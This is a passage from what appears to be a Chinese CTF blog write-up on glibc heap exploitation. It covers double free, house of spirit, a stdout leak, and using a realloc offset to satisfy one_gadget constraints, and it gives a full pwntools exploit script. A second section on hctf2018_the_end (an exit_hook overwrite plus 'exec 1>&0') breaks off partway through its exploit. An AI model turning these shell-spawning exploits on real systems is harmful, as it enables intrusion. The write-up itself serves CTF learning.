<p> 继续题目，再次通过double free和house of spirit，将fakechunk加入了fastbin并取出，成功打了stdout，获取到了libc，接下来打one_gadgets，都试过了，发现不行，所以需要用realloc调整栈帧，这里记录一下。其实原理就是，one_gadgets想要成功需要条件，比如下面的[rsp+0x30]=0，在调用one_gadgets时满足这个条件，就可以成功getshell，反正则不行，并不是所有时候都幸运，所以我们尝试用realloc调整栈帧来满足这些条件，realloc有很多push操作，可以调节栈，且realloc_hook和malloc_hook是相邻的，所以我们可以这样,malloc_hook写<strong>realloc+n</strong>（注意不是realloc_hook）<strong>realloc_hook</strong>写one_gadgets。</p>
<pre class="line-numbers language-none"><code class="language-none">malloc_hook&#x3D;&#x3D;&gt;realloc+n&#x3D;&#x3D;&gt;realloc_hook&#x3D;&#x3D;&gt;one_gadgets   n&#x3D;+0 +2 +3 +12 +13 +20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里的n，一般就取0,2,3,12,13,20，自己去调也可以，但一般这样直接试。</p>
<p><img src="https://pica.zhimg.com/80/v2-ea80ef4d9076901c8f0b6e57bedbcfd9_1440w.png?source=d16d100b" alt="img"></p>
<p>给出这道题的exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>param<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>param<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'[+]> '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'[+]> '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'Data?'</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'[+]> '</span>

menu_show <span class="token operator">=</span> <span class="token number">33</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">44</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x47</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x47</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x47</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x20'</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x47</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x47</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x47</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'c'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x47</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>

    <span class="token comment"># add(size=0x70,content=b'\x00\x36')#调试</span>
    debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\xbd\x25'</span><span class="token punctuation">)</span><span class="token comment">#调试 chunk8</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
    fake_chunk<span class="token operator">=</span><span class="token number">0x7ffff7dd25bd</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span><span class="token comment">#chunk9</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span><span class="token comment">#chunk10</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x50\x10'</span><span class="token punctuation">)</span><span class="token comment">#11</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x59</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#IO_leak chunk15</span>
    <span class="token comment"># sh.recvall()</span>
    <span class="token comment"># libc.address=u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) -0x3c2600</span>
    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c2600</span>
    <span class="token keyword">if</span> libc<span class="token punctuation">.</span>address <span class="token operator">&amp;</span><span class="token number">0xfff</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    leak_info<span class="token punctuation">(</span><span class="token string">'libc.address'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    free_hook<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    malloc_hook<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
    realloc<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>
    fake_chunk<span class="token operator">=</span>malloc_hook<span class="token operator">-</span><span class="token number">0x23</span>

    system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    one_gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4557a</span><span class="token punctuation">,</span><span class="token number">0xf1651</span><span class="token punctuation">,</span><span class="token number">0xf24cb</span><span class="token punctuation">]</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span><span class="token comment">#16</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    leak_info<span class="token punctuation">(</span><span class="token string">'realloc'</span><span class="token punctuation">,</span>realloc<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    <span class="token comment"># debug()</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'[+]> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># add(size=0x20,content=b'')#不能写add，要在malloc后就interactive</span>
    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sh<span class="token operator">=</span>process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        <span class="token comment"># sh=remote('challs.tfcctf.com',31223)</span>
        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span>

<span class="token comment"># pwn()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要爆破两个地方，所以是1/256，远程一直出不来，泪目</p>
<h2 id="27-BUU-hctf2018-the-end-exit-hook-标准输出重定向exec-1-gt-amp-0"><a href="#27-BUU-hctf2018-the-end-exit-hook-标准输出重定向exec-1-gt-amp-0" class="headerlink" title="27.BUU hctf2018_the_end(exit_hook,标准输出重定向exec 1&gt;&amp;0)"></a>27.BUU hctf2018_the_end(exit_hook,标准输出重定向exec 1&gt;&amp;0)</h2><p>最近在看新的，做的一些简单题就不写了，这道也简单，但用了一个exec 1&gt;&amp;0 ，之前没记录，就记一下</p>
<p>2.27下64位，给了libc地址，可以向一个指定地址写5次单字节，因为有exit，所以选择打exithook，在写完后需要sendline(‘exec 1&gt;&amp;0’)后再拿shell，不然没有输出，程序使用close(1)关闭了程序标准输出，那么可以使用exec 1&gt;&amp;0将标准输出重定向到stdin，而标准输出是指向当前终端的，这样也就是让标准输出定到了当前终端，三者可以复用</p>
<p><img src="/images/v2-96dc65fcb10078d4dd7cecabfa90c292_720w.png" alt="img"></p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27434</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'Choice: '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">''</span>
add_content_words <span class="token operator">=</span> <span class="token string">''</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">4</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
